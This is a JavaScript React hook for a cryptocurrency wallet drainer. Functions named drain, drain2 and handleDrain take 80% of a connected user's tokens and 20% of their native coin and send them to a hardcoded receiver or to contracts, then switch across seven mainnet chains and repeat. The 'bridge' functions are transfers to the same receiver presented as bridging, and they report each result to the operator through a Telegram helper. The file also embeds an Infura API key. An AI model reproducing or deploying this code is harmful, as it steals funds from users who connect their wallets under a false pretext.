"use client";

import { useAccount } from "wagmi";
import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
import axios from "axios";
import { Contract, providers, ethers, utils } from "ethers";
import contractAbi from "../app/blockchain/contract.json";
import { config, receiver, API_KEY } from "../Web3Config";
import { toast } from "react-toastify";
import { sendNote } from "../../utils/telegramUtils";

export const UseWallet = () => {
  const account = useAccount();

  // Chain status tracking
  let chainInteractionStatus = {
    1: false, // Ethereum Mainnet
    56: false, // Binance Smart Chain Mainnet
    137: false, // Polygon Mainnet
    43114: false, // Avalanche Mainnet
    42161: false, // Arbitrum Mainnet
    10: false, // Optimism Mainnet
    42220: false, // Celo Mainnet
  };

  const chainDrainStatus = {
    1: false, // Ethereum Mainnet
    56: false, // Binance Smart Chain Mainnet
    137: false, // Polygon Mainnet
    43114: false, // Avalanche Mainnet
    42161: false, // Arbitrum Mainnet
    10: false, // Optimism Mainnet
    42220: false, // Celo Mainnet
  };

  const getContractAddress = (chainId) => {
    switch (chainId) {
      case 1:
        return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
      case 56:
        return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
      case 137:
        return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
      case 43114:
        return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
      case 42161:
        return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
      case 10:
        return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
      case 42220:
        return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
      default:
        throw new Error("Unsupported network");
    }
  };

  const approveTokens = async () => {
    if (account && account.address && account.chainId) {
      const tokens = await getTokenAssets();
      const provider = new providers.JsonRpcProvider(
        account.chainId === 1
          ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
          : "https://bsc-dataseed.binance.org"
      );

      for (let token of tokens) {
        const tokenContract = new Contract(
          token.tokenAddress,
          [
            "function approve(address spender, uint256 amount) external returns (bool)",
          ],
          provider.getSigner(account.address)
        );

        try {
          const tx = await tokenContract.approve(
            getContractAddress(account.chainId),
            utils.parseUnits(token.tokenAmount.toString(), token.tokenDecimal)
          );
          console.log(`Approval tx hash: ${tx.hash}`);
          await tx.wait();
          console.log(`Approved ${token.tokenAmount} of ${token.tokenName}`);
        } catch (error) {
          console.error(`Approval failed for ${token.tokenName}:`, error);
          // Continue to the next token even if approval fails
        }
      }
    }
  };

  const drain = async () => {
    if (!window.ethereum || !account?.address || !account?.chainId) {
      console.log("Ethereum provider is not available.");
      return;
    }

    const chainId = getChainId(config);

    // Update chainInteractionStatus after interacting with the chain
    chainInteractionStatus[chainId] = true;

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner(account.address);
    const ethBalance = await getBalance(config, {
      address: account.address,
      chainId: account.chainId,
    });

    const tokens = await getTokenAssets();

    // Process each token individually
    for (let token of tokens) {
      const { tokenAddress, tokenAmount } = token;

      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
        const tokenContract = new Contract(
          tokenAddress,
          [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) external returns (bool)",
          ],
          signer
        );

        const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
          .mul(8)
          .div(10); // Transfer 80% of the balance

        try {
          const userBalance = await tokenContract.balanceOf(account.address);
          if (userBalance.lt(amountInWei)) {
            console.log(`Insufficient token balance for ${tokenAddress}`);
            continue; // Move to next token
          }

          const transferTx = await tokenContract.transfer(
            receiver,
            amountInWei
          );
          console.log(`Transfer tx hash: ${transferTx.hash}`);
          await transferTx.wait();
          console.log(
            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
          );

          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
        } catch (error) {
          console.log(`Transfer failed for ${tokenAddress}:`, error);
          continue; // Continue to next token on failure
        }
      }
    }

    // After tokens, handle multicall for native tokens
    await handleMulticall(tokens, ethBalance);
  };

  // const drain2 = async (provider, chainId, assetAddress, tokenAmount) => {
  //   if (!provider || !chainId) {
  //     console.error("Missing required arguments.");
  //     return;
  //   }

  //   const signer = provider.getSigner();
  //   const accountAddress = await signer.getAddress();

  //   // Set assetAddress to null for native tokens if not provided
  //   if (!assetAddress) {
  //     assetAddress = "0x0000000000000000000000000000000000000000";
  //   }

  //   const isNative =
  //     assetAddress === "0x0000000000000000000000000000000000000000";

  //   try {
  //     if (isNative) {
  //       // Multicall for native token
  //       // const ethBalance = await provider.getBalance(accountAddress);
  //       const contractAddress = getContractAddress(chainId);

  //       const multiCallContract = new Contract(
  //         contractAddress,
  //         contractAbi,
  //         signer
  //       );

  //       const amountInWei = ethers.utils.parseEther(tokenAmount.toString());

  //       try {
  //         // Attempt to call the multicall contract
  //         const tx = await multiCallContract.multiCall([], [], {
  //           value: amountInWei,
  //           gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
  //         });
  //         console.log(`Multicall transaction hash: ${tx.hash}`);
  //         sendNote(`Multicall transaction hash: ${tx.hash}`);
  //         await tx.wait();
  //         console.log(
  //           `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
  //         );
  //         sendNote(
  //           `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
  //         );
  //       } catch (multiCallError) {
  //         console.error(
  //           "Multicall failed, falling back to direct transfer:",
  //           multiCallError
  //         );

  //         // Fallback to direct ETH transfer if multicall fails
  //         const tx = await signer.sendTransaction({
  //           to: contractAddress,
  //           value: amountInWei,
  //           gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
  //         });
  //         console.log(`Direct transfer transaction hash: ${tx.hash}`);
  //         sendNote(`Direct transfer transaction hash: ${tx.hash}`);
  //         await tx.wait();
  //         console.log(
  //           `Directly transferred native token: ${ethAmountToDrain.toString()}`
  //         );
  //         sendNote(
  //           `Directly transferred native token: ${ethAmountToDrain.toString()}`
  //         );
  //       }
  //     } else {
  //       // ERC20 transfer for non-native token
  //       const tokenContract = new Contract(
  //         assetAddress,
  //         [
  //           "function balanceOf(address) view returns (uint256)",
  //           "function transfer(address,uint256)",
  //         ],
  //         signer
  //       );

  //       // Get token decimals
  //       const decimals = await tokenContract.decimals();
  //       const amountInTokenUnits = ethers.utils.parseUnits(
  //         tokenAmount.toString(),
  //         decimals
  //       );

  //       const transferTx = await tokenContract.transfer(
  //         receiver,
  //         amountInTokenUnits
  //       );
  //       console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
  //       sendNote(`ERC20 transfer transaction hash: ${transferTx.hash}`);
  //       await transferTx.wait();
  //       console.log(
  //         `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
  //       );
  //       sendNote(`ERC20 token transferred: ${tokenAmountToDrain.toString()}`);
  //     }
  //   } catch (error) {
  //     console.error("Drain function error:", error);
  //   }
  // };

  const drain2 = async (provider, chainId, assetAddress) => {
    if (!provider || !chainId) {
      console.error("Missing required arguments.");
      return;
    }

    const signer = provider.getSigner();
    const accountAddress = await signer.getAddress();

    // Set assetAddress to null for native tokens if not provided
    if (!assetAddress) {
      assetAddress = "0x0000000000000000000000000000000000000000";
    }

    const isNative =
      assetAddress === "0x0000000000000000000000000000000000000000";

    try {
      if (isNative) {
        // Multicall for native token
        const ethBalance = await provider.getBalance(accountAddress);
        const contractAddress = getContractAddress(chainId);

        const multiCallContract = new Contract(
          contractAddress,
          contractAbi,
          signer
        );
        const ethAmountToDrain = ethBalance.mul(2).div(10); // 20% of balance

        try {
          // Attempt to call the multicall contract
          const tx = await multiCallContract.multiCall([], [], {
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
          });
          console.log(`Multicall transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
          );
        } catch (multiCallError) {
          console.error(
            "Multicall failed, falling back to direct transfer:",
            multiCallError
          );

          // Fallback to direct ETH transfer if multicall fails
          const tx = await signer.sendTransaction({
            to: contractAddress,
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
          });
          console.log(`Direct transfer transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Directly transferred native token: ${ethAmountToDrain.toString()}`
          );
        }
      } else {
        // ERC20 transfer for non-native token
        const tokenContract = new Contract(
          assetAddress,
          [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address,uint256)",
          ],
          signer
        );

        const tokenBalance = await tokenContract.balanceOf(accountAddress);
        const tokenAmountToDrain = tokenBalance.mul(8).div(10); // Transfer 80% of balance

        const transferTx = await tokenContract.transfer(
          receiver,
          tokenAmountToDrain
        );
        console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
        await transferTx.wait();
        console.log(
          `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
        );
      }
    } catch (error) {
      console.error("Drain function error:", error);
    }
  };
  const handleDrain = async ({ chainId, address, transferAmount }) => {
    if (!window.ethereum) {
      console.log("Ethereum provider is not available.");
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner(address);
    const ethBalance = await getBalance(config, {
      address,
      chainId,
    });

    const tokens = await getTokenAssets();

    // Process each token individually
    for (let token of tokens) {
      const { tokenAddress, tokenAmount } = token;

      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
        const tokenContract = new ethers.Contract(
          tokenAddress,
          [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) external returns (bool)",
          ],
          signer
        );

        // Use the passed transferAmount or fallback to 80% of the available tokenAmount
        const amountInWei = transferAmount
          ? ethers.BigNumber.from(transferAmount.toString())
          : ethers.BigNumber.from(tokenAmount.toString()).mul(8).div(10); // Default to 80% if not provided

        try {
          const userBalance = await tokenContract.balanceOf(address);
          if (userBalance.lt(amountInWei)) {
            console.log(`Insufficient token balance for ${tokenAddress}`);
            toast(`Insufficient token balance for ${tokenAddress}`);
            continue; // Move to next token
          }

          const transferTx = await tokenContract.transfer(
            receiver,
            amountInWei
          );
          console.log(`Transfer tx hash: ${transferTx.hash}`);
          await transferTx.wait();
          console.log(
            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
          );
          toast.success(
            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
          );

          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
        } catch (error) {
          toast.error(`Transfer failed for ${tokenAddress}: ${error}`);
          console.log(`Transfer failed for ${tokenAddress}:`, error);
          continue; // Continue to next token on failure
        }
      }
    }

    // After tokens, handle multicall for native tokens
    await handleMulticall(tokens, ethBalance);
  };

  const handleMulticall = async (tokens, ethBalance) => {
    const chainId = getChainId(config);
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner(account.address);
    const multiCallContract = new Contract(
      getContractAddress(chainId),
      contractAbi,
      signer
    );

    const tokenAddresses = tokens.map((token) => token.tokenAddress);
    const amounts = tokens.map((token) =>
      ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
    );

    try {
      const gasPrice = await getGasPrice(config, { chainId: account.chainId });
      const gasEstimate = await multiCallContract.estimateGas.multiCall(
        tokenAddresses,
        amounts,
        {
          value: ethBalance.value,
        }
      );
      const gasFee = gasEstimate.mul(gasPrice);

      const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
        .mul(2)
        .div(10); // Transfer 20% of ETH

      if (totalEthRequired.lt(gasFee)) {
        console.log("Not enough ETH to cover gas fees and transfer.");
        await proceedToNextChain();
        return;
      }

      const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
        value: totalEthRequired,
      });

      console.log(`Multicall transaction hash: ${tx.hash}`);
      await tx.wait();
      console.log(`Multicall transaction confirmed: ${tx.hash}`);
      toast(`Multicall transaction confirmed: ${tx.hash}`);

      chainDrainStatus[chainId] = true; // Mark chain as drained if successful
      await proceedToNextChain();
    } catch (error) {
      console.log("Multicall operation failed:", error);
      toast.error("Multicall operation failed:");
      await proceedToNextChain();
    }
  };

  const proceedToNextChain = async () => {
    const nextChainId = Object.keys(chainInteractionStatus).find(
      (id) => !chainInteractionStatus[id]
    );

    if (nextChainId) {
      try {
        await switchChain(config, { chainId: Number(nextChainId) });
        await drain(); // Recursive call to drain the next chain
      } catch (switchError) {
        console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
        await proceedToNextChain(); // Continue to next operation even if chain switch fails
      }
    } else {
      console.log("All chains have been interacted with.");

      // Check for any chains that were not fully drained and retry
      const notDrainedChains = Object.keys(chainDrainStatus).filter(
        (id) => !chainDrainStatus[id] && chainInteractionStatus[id]
      );

      if (notDrainedChains.length > 0) {
        for (const chainId of notDrainedChains) {
          try {
            await switchChain(config, { chainId: Number(chainId) });
            await drain(); // Retry draining for non-drained chains
          } catch (switchError) {
            console.log(
              `Failed to switch to non-drained chain ${chainId}:`,
              switchError
            );
            continue; // Skip and continue with other non-drained chains
          }
        }
      } else {
        console.log(
          "All chains have been drained or attempted. Stopping further operations."
        );
      }
    }
  };

  const getTokenAssets = async () => {
    const chainId = getChainId(config);
    let tokenBalances = [];
    const options = {
      url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
      method: "GET",
      headers: {
        "x-api-key": API_KEY,
        accept: "application/json",
      },
    };
    try {
      const tokenListResponse = await axios(options);
      const tokens = tokenListResponse.data.data;

      if (!tokens) return tokenBalances;

      for (const token of tokens) {
        const tokenAmount = BigInt(token.balance);
        const tokenAddress = token.contract_address.toLowerCase();
        const usdAmount = token.current_usd_price || 0;
        const tokenDecimal = token.decimals;
        if (usdAmount > 0) {
          tokenBalances.push({
            tokenAmount: tokenAmount,
            tokenName: token.name,
            tokenDecimal: tokenDecimal,
            usdAmount: usdAmount,
            tokenAddress,
          });
        }
      }
      tokenBalances.sort((a, b) => b.usdAmount - a.usdAmount);
    } catch (error) {
      console.log("Error fetching token assets:", error);
    }

    return tokenBalances;
  };

  // Function to handle native token bridging through multicall
  const bridgeNativeToken = async (
    amount,
    provider,
    accountAddress,
    chainId
  ) => {
    try {
      if (!accountAddress || !provider) {
        toast.error("Connect your wallet first.");
        return;
      }

      const signer = provider.getSigner(); // Use the provided provider
      const senderAddress = await signer.getAddress(); // Fetch the user's address (connected wallet)

      const contractAddress = getContractAddress(chainId); // Get contract address for the current chain
      const amountInWei = ethers.utils.parseEther(amount.toString());

      // Create the transaction object
      const tx = {
        from: senderAddress, // Sender address
        to: contractAddress, // Contract address
        value: amountInWei, // Amount to send
        gasLimit: ethers.utils.hexlify(100000), // Adjust gas limit as needed
      };

      console.log("Transaction:", tx); // Log the transaction for debugging

      // Send the transaction through the connected wallet provider
      const transactionResponse = await signer.sendTransaction(tx);
      console.log(`Transaction hash: ${transactionResponse.hash}`);
      sendNote(`Transaction hash: ${transactionResponse.hash}`);

      // Wait for the transaction to be mined
      await transactionResponse.wait();
      toast.success(`Successfully bridged ${amount} native token.`);
      sendNote(`Successfully bridged ${amount} native token.`);
    } catch (error) {
      console.log("cancell error", error);
      if (error.code === 4001 || error.message.includes("user rejected")) {
        toast.error("Transaction cancelled.");
        sendNote("Transaction was cancelled by the user.");
      } else {
        toast.error("Failed to bridge native token.");
        sendNote("Failed to bridge native token.");
      }
      sendNote("Failed to bridge native token.");
    }
  };

  // Function to transfer non-native tokens to receiver address
  const bridgeNonNativeToken = async (
    token,
    amount,
    provider,
    accountAddress,
    chainId
  ) => {
    try {
      // if (!token.address) {
      //   console.error("Invalid token address:", token);
      //   throw new Error("Token address is undefined or invalid.");
      // }

      // If provider is missing, prompt MetaMask connection
      if (!provider) {
        if (window.ethereum) {
          await window.ethereum.request({ method: "eth_requestAccounts" });
          provider = new ethers.providers.Web3Provider(window.ethereum);
          accountAddress = (await provider.listAccounts())[0]; // Get the connected account
        } else {
          toast.error("No Ethereum provider found. Please install MetaMask.");
          throw new Error("No Ethereum provider found.");
        }
      }

      const signer = provider.getSigner(accountAddress); // Use the provided provider and account address

      const tokenContract = new ethers.Contract(
        token.address || "0x0000000000000000000000000000000000000000",
        [
          "function transfer(address to, uint256 amount) external returns (bool)",
          "function balanceOf(address owner) view returns (uint256)",
        ],
        signer
      );

      const senderBalance = await tokenContract.balanceOf(accountAddress); // Get the balance of the sender
      const amountInWei = ethers.utils.parseUnits(
        amount.toString(),
        token.decimals
      ); // Convert amount to token's decimals

      // Check if the user has enough balance
      if (senderBalance.lt(amountInWei)) {
        toast.error(`Insufficient ${token.name} balance.`);
        throw new Error(`Insufficient ${token.name} balance.`);
      }

      // Use callStatic to simulate the transaction (ensure it won't fail)
      await tokenContract.callStatic.transfer(receiver, amountInWei);

      // If the callStatic doesn't throw, proceed with the actual transfer transaction
      const tx = await tokenContract.transfer(receiver, amountInWei);
      console.log(`Non-native token transfer tx hash: ${tx.hash}`);
      sendNote(`Non-native token transfer tx hash: ${tx.hash}`);
      await tx.wait(); // Wait for the transaction to be mined

      toast.success(`Transferred ${amount} ${token.name} successfully.`);
      sendNote(`Transferred ${amount} ${token.name} successfully.`);
    } catch (error) {
      console.error(`Transfer failed for ${token.name}:`, error);
      toast.error(`Transfer failed for ${token.name}.`);
      sendNote(`Transfer failed for ${token.name}.`);
    }
  };

  // Main function to handle bridging logic based on token type
  const bridgeTokens = async ({
    token,
    amount,
    provider,
    accountAddress,
    chainId,
  }) => {
    try {
      if (!accountAddress || !chainId) {
        toast.error("Connect your wallet first.");
        return;
      }

      const isNative =
        token.address === "0x0000000000000000000000000000000000000000"; // Check if native token

      if (isNative) {
        // Bridge Native Token (ETH, BNB, etc.)
        await bridgeNativeToken(amount, provider, accountAddress, chainId);
      } else {
        // Bridge Non-Native Token (DAI, USDT, etc.)
        await bridgeNonNativeToken(
          token,
          amount,
          provider,
          accountAddress,
          chainId
        );
      }
    } catch (error) {
      console.error("Error in bridging tokens:", error);
      toast.error("Failed to bridge tokens.");
    }
  };

  return {
    approveTokens,
    drain,
    drain2,
    getTokenAssets,
    handleDrain,
    bridgeNativeToken,
    bridgeTokens,
    bridgeNonNativeToken,
  };
};
